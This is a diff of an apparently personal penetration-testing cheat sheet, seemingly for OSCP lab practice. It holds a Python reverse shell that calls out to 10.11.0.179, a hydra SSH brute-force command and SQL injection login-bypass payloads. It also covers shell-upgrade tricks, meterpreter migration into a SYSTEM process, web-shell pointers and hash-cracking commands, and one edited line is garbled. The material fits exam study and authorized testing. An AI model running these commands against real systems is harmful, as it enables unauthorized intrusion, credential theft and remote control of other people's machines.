@@ -226,7 +226,7 @@ $>enumalsgroups domain
 $>enumalsgroups builtin
 $>queryuser 500
 $>
-$> lookupnames administrator
+$> lookupnames administratornet use
 $> lookupnames administrators
 
 C:\> net use
@@ -284,8 +284,6 @@ tool: snmpwalk
     1.3.6.1.2.1.25.6.3.1.2  Software Name
     1.3.6.1.4.1.77.1.2.25   User Accounts
     1.3.6.1.2.1.6.13.1.3    TCP Local Ports
-
-
 
 
 
@@ -385,6 +383,7 @@ msf > show advanced
 msf > search type:exploits psexec
 
 
+
 SSH:
 Bruteforcing (come up with username list from enumeration, use wordlists for common pass)
 hydra -e nsr -V -F -t 4 -u -L /root/userlist-pumpkin.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.131:22
@@ -396,9 +395,11 @@ shell cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-chea
 
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.179",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-Shell breakouts: 
+Shell breakouts/upgrades: 
 (https://netsec.ws/?p=337) 
 (https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells)
+(https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
+(history: http://www.linusakesson.net/programming/tty/)
 python -c 'import pty; pty.spawn("/bin/bash")'
 echo os.system('/bin/bash')
 /bin/sh -i
@@ -406,6 +407,13 @@ perl -e 'exec "/bin/sh";'
 lua: os.execute('/bin/sh')
 export PATH=/bin:/usr/bin:$PATH
 export SHELL=/bin/sh
+
+fully interatice shell with netcat: (ref https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell)
+python -c 'import pty; pty.spawn("/bin/bash");'
+CTRL-Z (to background netcat)
+stty raw -echo
+fg
+(you should now be able to use tab autocomplete, and interactive commands like 'su' and 'nano')
 
 
 get command shell (reverse or bind): 
@@ -586,6 +594,11 @@ admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 
 
+webshells! (where you will make $)
+kali has a bunch
+http://pentestmonkey.net/category/tools/web-shells
+
+
 Buffer overflows: (less likely, but hey maybe)   (ASLR and DEP are not your friend)
 Dostackbufferoverflowgood (google it, learn)
 OSCP practicing with debugger
@@ -593,7 +606,7 @@ OSCP practicing with debugger
 
 
 
-Some common reliable exploits to remember:
+Some common, semi-reliable exploits to remember:
 ms17_010 (eternalblue, smb windows vuln older versions)
 tomcat_mgr_upload (requires creds, can often be found after initial exploit in xml file on server)
 linux kernel exploits 
@@ -614,7 +627,7 @@ meterpreter > idletime
 
 migration
 meterpreter > getpid
-meterpreter > ps    (choose a clandestine service PID with root/SYSTEM privileges)
+meterpreter > ps    (choose a clandestine service PID with root/SYSTEM privileges if you can)
 meterpreter > migrate [PID]
 meterpreter > kill [PID]
 
@@ -1118,14 +1131,18 @@ you can try to sniff them off the network (OS independent)
 password cracking:
 hash-identifier (kali)
 
-john the ripper (classic CPU based cracker, tons formats and decent auto-detection) better than hashcat for small passwords
+john the ripper (classic CPU based cracker, tons formats and decent auto-detection) better than hashcat for very small passwords
 ./unshadow script in john (linux/unix)
 john --format=format --wordlist=/path/to/wordlist.txt --pot=target.pot hashes.file
 john --show hashes.file
 
 
 hashcat (GPU based, more active dev) 
-hashcat -a=ATTACKMODE -m 5600(HASHTYPE value) -I CHARSETMASK(a,I,u,d,h,H,etc)  
+hashcat -a=ATTACKMODE -m 5600(HASHTYPE value) -I CHARSETMASK(a,I,u,d,h,H,etc)
+
+example on windows:
+.\hashcat64.exe --hash-type=1800 --attack-mode=0 --workload-profile=3 --optimized-kernel-enable --outfile=71.cracked unshadow.71 rockyou.txt
+
 
 ophcrack      (for Windows)
 
